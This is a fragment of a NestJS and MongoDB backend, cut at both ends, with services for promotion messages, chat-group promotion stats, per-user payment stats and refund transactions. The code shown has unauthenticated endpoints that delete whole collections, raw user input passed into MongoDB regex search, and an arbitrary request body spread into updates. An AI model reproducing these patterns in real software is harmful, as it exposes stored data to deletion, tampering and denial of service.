}]),\r\n  ],\r\n  providers: [PromoteMsgsService],\r\n  controllers: [PromoteMsgsController],\r\n  exports: [PromoteMsgsService],\r\n})\r\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type PromoteMsgDocument = PromoteMsg & Document;\r\n\r\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\r\n    toJSON: {\r\n      virtuals: true,\r\n      transform: (doc, ret) => {\r\n        delete ret._id;\r\n      },\r\n    },})\r\nexport class PromoteMsg {}\r\n\r\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\r\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { PromoteMsg } from './promote-msgs.schema';\r\n\r\n@Injectable()\r\nexport class PromoteMsgsService {\r\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\r\n    }\r\n\r\n    async OnModuleInit() {\r\n        console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\r\n        if (!user) {\r\n            throw new NotFoundException(`promotemsgModel not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`promotemsgModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","// create-promote-stat.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreatePromoteStatDto {\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\r\n  data: Map<string, number>;\r\n\r\n  @ApiProperty({ example: 552, description: 'Total Count' })\r\n  totalCount: number;\r\n\r\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\r\n  uniqueChannels: number;\r\n\r\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\r\n  releaseDay: number;\r\n\r\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\r\n  lastUpdatedTimeStamp: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Is Active' })\r\n  isActive: boolean;\r\n\r\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\r\n  channels: string[];\r\n}\r\n","// update-promote-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\r\n\r\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\r\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { PromoteStatService } from './promote-stat.service';\r\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\r\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\r\n\r\n@ApiTags('promote-stats')\r\n@Controller('promote-stats')\r\nexport class PromoteStatController {\r\n  constructor(private readonly promoteStatService: PromoteStatService) {}\r\n\r\n  @Post()\r\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\r\n    return this.promoteStatService.create(createPromoteStatDto);\r\n  }\r\n\r\n  @Get(':client')\r\n  async findByClient(@Param('client') client: string) {\r\n    return this.promoteStatService.findByClient(client);\r\n  }\r\n\r\n  @Put(':client')\r\n  async update(\r\n    @Param('client') client: string,\r\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\r\n  ) {\r\n    return this.promoteStatService.update(client, updatePromoteStatDto);\r\n  }\r\n\r\n  @Delete(':client')\r\n  async deleteOne(@Param('client') client: string) {\r\n    return this.promoteStatService.deleteOne(client);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.promoteStatService.deleteAll();\r\n  }\r\n}\r\n","import { initModule } from './../ConfigurationInit/init.module';\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteStatService } from './promote-stat.service';\r\nimport { PromoteStatController } from './promote-stat.controller';\r\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\r\nimport { ClientModule } from '../clients/client.module';\r\n\r\n@Module({\r\n  imports: [initModule,\r\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\r\n    ClientModule\r\n  ],\r\n  controllers: [PromoteStatController],\r\n  providers: [PromoteStatService],\r\n  exports: [PromoteStatService]\r\n})\r\nexport class PromoteStatModule { }\r\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\r\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\r\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\r\nimport { ClientService } from '../clients/client.service';\r\n\r\n@Injectable()\r\nexport class PromoteStatService {\r\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\r\n    @Inject(forwardRef(() => ClientService))\r\n    private clientService: ClientService,) { }\r\n\r\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\r\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\r\n    return createdPromoteStat.save();\r\n  }\r\n\r\n  async findAll(): Promise<PromoteStat[]> {\r\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\r\n    return promoteStat;\r\n  }\r\n\r\n\r\n  async findByClient(client: string): Promise<PromoteStat> {\r\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\r\n    if (!promoteStat) {\r\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\r\n    }\r\n    return promoteStat;\r\n  }\r\n\r\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\r\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\r\n    if (!promoteStat) {\r\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\r\n    }\r\n    return promoteStat;\r\n  }\r\n\r\n  async deleteOne(client: string): Promise<void> {\r\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\r\n    }\r\n  }\r\n\r\n  async deleteAll(): Promise<void> {\r\n    await this.promoteStatModel.deleteMany({}).exec();\r\n  }\r\n\r\n  async reinitPromoteStats() {\r\n    const users = await this.findAll()\r\n    for (const user of users) {\r\n      await this.promoteStatModel.updateOne({ client: user.client },\r\n        {\r\n          $set: {\r\n            totalCount: 0,\r\n            uniqueChannels: 0,\r\n            releaseDay: Date.now(),\r\n            lastUpdatedTimeStamp: Date.now(),\r\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\r\n          }\r\n        }\r\n      );\r\n    }\r\n  }\r\n}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type PromoteStatDocument = PromoteStat & Document;\r\n\r\n@Schema()\r\nexport class PromoteStat {\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\r\n  @Prop({ required: true, unique: true })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\r\n  @Prop({ required: true, type: Map, of: Number })\r\n  data: Map<string, number>;\r\n\r\n  @ApiProperty({ example: 552, description: 'Total Count' })\r\n  @Prop({ required: true })\r\n  totalCount: number;\r\n\r\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\r\n  @Prop({ required: true })\r\n  uniqueChannels: number;\r\n\r\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\r\n  @Prop({ required: true })\r\n  releaseDay: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Is Active' })\r\n  @Prop({ required: true })\r\n  isActive: boolean;\r\n\r\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\r\n  @Prop({ required: true })\r\n  lastUpdatedTimeStamp: number;\r\n\r\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\r\n  @Prop({ required: true, type: [String] })\r\n  channels: string[];\r\n}\r\n\r\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\r\n","// create-stat.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateStatDto {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  profile: string;\r\n}\r\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { Stat2Service } from './stat2.service';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\nimport { UpdateStatDto } from './update-stat2.dto';\r\n\r\n@ApiTags('stats2')\r\n@Controller('stats2')\r\nexport class Stat2Controller {\r\n  constructor(private readonly statService: Stat2Service) {}\r\n\r\n  @Post()\r\n  async create(@Body() createStatDto: CreateStatDto) {\r\n    return this.statService.create(createStatDto);\r\n  }\r\n\r\n  @Get(':chatId/:profile')\r\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.findByChatIdAndProfile(chatId, profile);\r\n  }\r\n\r\n  @Put(':chatId/:profile')\r\n  async update(\r\n    @Param('chatId') chatId: string,\r\n    @Param('profile') profile: string,\r\n    @Body() updateStatDto: UpdateStatDto,\r\n  ) {\r\n    return this.statService.update(chatId, profile, updateStatDto);\r\n  }\r\n\r\n  @Delete(':chatId/:profile')\r\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.deleteOne(chatId, profile);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.statService.deleteAll();\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { Stat2Service } from './stat2.service';\r\nimport { Stat2Controller } from './stat2.controller';\r\nimport { StatSchema } from './stat2.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n    imports: [\r\n        initModule,\r\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\r\n    controllers: [Stat2Controller],\r\n    providers: [Stat2Service],\r\n    exports: [Stat2Service]\r\n})\r\nexport class Stat2Module { }\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type Stat2Document = Stat2 & Document;\r\n\r\n@Schema()\r\nexport class Stat2 {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  @Prop({ required: true })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  @Prop({ required: true })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  @Prop({ required: true })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  @Prop({ required: true })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  @Prop({ required: true })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  @Prop({ required: true })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  @Prop({ required: true })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  @Prop({ required: true })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  @Prop({ required: true })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  @Prop({ required: false })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  @Prop({ required: true })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  @Prop({ required: true })\r\n  profile: string;\r\n}\r\n\r\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\r\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\nimport { UpdateStatDto } from './update-stat2.dto';\r\nimport { Stat2, Stat2Document } from './stat2.schema';\r\n\r\n@Injectable()\r\nexport class Stat2Service {\r\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\r\n\r\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\r\n    const createdStat = new this.statModel(createStatDto);\r\n    return createdStat.save();\r\n  }\r\n\r\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\r\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\r\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async findAll(): Promise<Stat2[]> {\r\n    const stats = await this.statModel.find().exec();\r\n    return stats;\r\n  }\r\n\r\n  async deleteOne(chatId: string, profile: string): Promise<void> {\r\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n  }\r\n\r\n  async deleteAll(): Promise<void> {\r\n    await this.statModel.deleteMany({}).exec();\r\n  }\r\n}\r\n","// update-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\n\r\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\r\n","// create-stat.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateStatDto {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  profile: string;\r\n}\r\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { StatService } from './stat.service';\r\nimport { CreateStatDto } from './create-stat.dto';\r\nimport { UpdateStatDto } from './update-stat.dto';\r\n\r\n@ApiTags('stats')\r\n@Controller('stats')\r\nexport class StatController {\r\n  constructor(private readonly statService: StatService) {}\r\n\r\n  @Post()\r\n  async create(@Body() createStatDto: CreateStatDto) {\r\n    return this.statService.create(createStatDto);\r\n  }\r\n\r\n  @Get(':chatId/:profile')\r\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.findByChatIdAndProfile(chatId, profile);\r\n  }\r\n\r\n  @Put(':chatId/:profile')\r\n  async update(\r\n    @Param('chatId') chatId: string,\r\n    @Param('profile') profile: string,\r\n    @Body() updateStatDto: UpdateStatDto,\r\n  ) {\r\n    return this.statService.update(chatId, profile, updateStatDto);\r\n  }\r\n\r\n  @Delete(':chatId/:profile')\r\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.deleteOne(chatId, profile);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.statService.deleteAll();\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { StatService } from './stat.service';\r\nimport { StatController } from './stat.controller';\r\nimport { StatSchema } from './stat.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n    imports: [\r\n        initModule,\r\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\r\n    controllers: [StatController],\r\n    providers: [StatService],\r\n    exports:[StatService]\r\n})\r\nexport class StatModule { }\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type StatDocument = Stat & Document;\r\n\r\n@Schema()\r\nexport class Stat {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  @Prop({ required: true })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  @Prop({ required: true })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  @Prop({ required: true })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  @Prop({ required: true })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  @Prop({ required: true })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  @Prop({ required: true })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  @Prop({ required: true })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  @Prop({ required: true })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  @Prop({ required: true })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  @Prop({ required: false })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  @Prop({ required: true })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  @Prop({ required: true })\r\n  profile: string;\r\n}\r\n\r\nexport const StatSchema = SchemaFactory.createForClass(Stat);\r\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateStatDto } from './create-stat.dto';\r\nimport { UpdateStatDto } from './update-stat.dto';\r\nimport { Stat, StatDocument } from './stat.schema';\r\n\r\n@Injectable()\r\nexport class StatService {\r\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\r\n\r\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\r\n    const createdStat = new this.statModel(createStatDto);\r\n    return createdStat.save();\r\n  }\r\n\r\n  async findAll(): Promise<Stat[]> {\r\n    const stats = await this.statModel.find().exec();\r\n    return stats;\r\n  }\r\n\r\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\r\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\r\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async deleteOne(chatId: string, profile: string): Promise<void> {\r\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n  }\r\n\r\n  async deleteAll(): Promise<void> {\r\n    await this.statModel.deleteMany({}).exec();\r\n  }\r\n}\r\n","// update-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateStatDto } from './create-stat.dto';\r\n\r\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateTransactionDto {\r\n  @ApiProperty({ description: 'Unique transaction ID (UTR).' })\r\n  transactionId: string;\r\n\r\n  @ApiProperty({ description: 'Amount involved in the transaction.' })\r\n  amount: number;\r\n\r\n  @ApiProperty({ description: 'Issue type reported by the user.' })\r\n  issue: string;\r\n  \r\n  @ApiProperty({ description: 'Description of issue reported by the user.' })\r\n  description: string;\r\n\r\n  @ApiProperty({ description: 'Refund method selected by the user.' })\r\n  refundMethod: string;\r\n\r\n  @ApiProperty({ description: 'User profile ID.' })\r\n  profile: string;\r\n\r\n  @ApiProperty({ description: 'User chat ID.' })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'IP address of the user.' })\r\n  ip: string;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateTransactionDto } from './create-transaction.dto';\r\n\r\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\n\r\n@Schema({ timestamps: true })\r\nexport class Transaction extends Document {\r\n  @Prop({ required: false })\r\n  transactionId: string;\r\n\r\n  @Prop({ required: false })\r\n  amount: number;\r\n\r\n  @Prop({ required: false })\r\n  issue: string;\r\n\r\n  @Prop({ required: false })\r\n  description: string;\r\n\r\n  @Prop()\r\n  refundMethod: string;\r\n\r\n  @Prop({ required: false })\r\n  profile: string;\r\n\r\n  @Prop({ required: false })\r\n  chatId: string;\r\n\r\n  @Prop({ required: false })\r\n  ipAddress: string;\r\n}\r\n\r\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);\r\n","import { Body, Controller, Get, Post, Put, Delete, Param, Query } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse } from '@nestjs/swagger';\r\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\r\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\r\nimport { TransactionService } from './transaction.service';\r\n\r\n@ApiTags('Transactions')\r\n@Controller('transactions')\r\nexport class TransactionController {\r\n  constructor(private readonly transactionService: TransactionService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new transaction' })\r\n  @ApiResponse({ status: 201, description: 'Transaction created successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input.' })\r\n  async create(@Body() createTransactionDto: CreateTransactionDto) {\r\n    return this.transactionService.create(createTransactionDto);\r\n  }\r\n\r\n  @Get(':id')\r\n  @ApiOperation({ summary: 'Get transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction retrieved successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async findOne(@Param('id') id: string) {\r\n    return this.transactionService.findOne(id);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all transactions or search transactions' })\r\n  @ApiResponse({ status: 200, description: 'Transactions retrieved successfully.' })\r\n  async findAll(\r\n    @Query('search') search?: string,\r\n    @Query('limit') limit?: number,\r\n    @Query('offset') offset?: number,\r\n  ) {\r\n    return this.transactionService.findAll(search, limit, offset);\r\n  }\r\n\r\n  @Put(':id')\r\n  @ApiOperation({ summary: 'Update a transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction updated successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async update(\r\n    @Param('id') id: string,\r\n    @Body() updateTransactionDto: UpdateTransactionDto,\r\n  ) {\r\n    return this.transactionService.update(id, updateTransactionDto);\r\n  }\r\n\r\n  @Delete(':id')\r\n  @ApiOperation({ summary: 'Delete a transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction deleted successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async delete(@Param('id') id: string) {\r\n    return this.transactionService.delete(id);\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { TransactionService } from './transaction.service';\r\nimport { TransactionController } from './transaction.controller';\r\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\r\n\r\n@Module({\r\n  imports: [\r\n    MongooseModule.forFeature([\r\n      { name: Transaction.name, schema: TransactionSchema },\r\n    ]),\r\n  ],\r\n  controllers: [TransactionController],\r\n  providers: [TransactionService],\r\n  exports:[TransactionService]\r\n})\r\nexport class TransactionModule {}\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\r\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\r\nimport { Transaction } from './schemas/transaction.schema';\r\n\r\n@Injectable()\r\nexport class TransactionService {\r\n  constructor(\r\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<Transaction>,\r\n  ) {}\r\n\r\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\r\n    const newTransaction = new this.transactionModel(createTransactionDto);\r\n    return await newTransaction.save();\r\n  }\r\n\r\n  async findOne(id: string): Promise<Transaction> {\r\n    const transaction = await this.transactionModel.findById(id).exec();\r\n    if (!transaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return transaction;\r\n  }\r\n\r\n  async findAll(\r\n    search?: string,\r\n    limit = 10,\r\n    offset = 0,\r\n  ): Promise<{ transactions: Transaction[]; total: number }> {\r\n    const query = search\r\n      ? {\r\n          $or: [\r\n            { transactionId: { $regex: search, $options: 'i' } },\r\n            { issue: { $regex: search, $options: 'i' } },\r\n            { profile: { $regex: search, $options: 'i' } },\r\n            { chatId: { $regex: search, $options: 'i' } },\r\n          ],\r\n        }\r\n      : {};\r\n\r\n    const transactions = await this.transactionModel\r\n      .find(query)\r\n      .skip(offset)\r\n      .limit(limit)\r\n      .exec();\r\n    const total = await this.transactionModel.countDocuments(query).exec();\r\n\r\n    return { transactions, total };\r\n  }\r\n\r\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\r\n    const updatedTransaction = await this.transactionModel\r\n      .findByIdAndUpdate(id, updateTransactionDto, { new: true })\r\n      .exec();\r\n    if (!updatedTransaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return updatedTransaction;\r\n  }\r\n\r\n  async delete(id: string): Promise<Transaction> {\r\n    const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\r\n    if (!deletedTransaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return deletedTransaction;\r\n  }\r\n}\r\n","import { Controller, Get, Body, Patch } 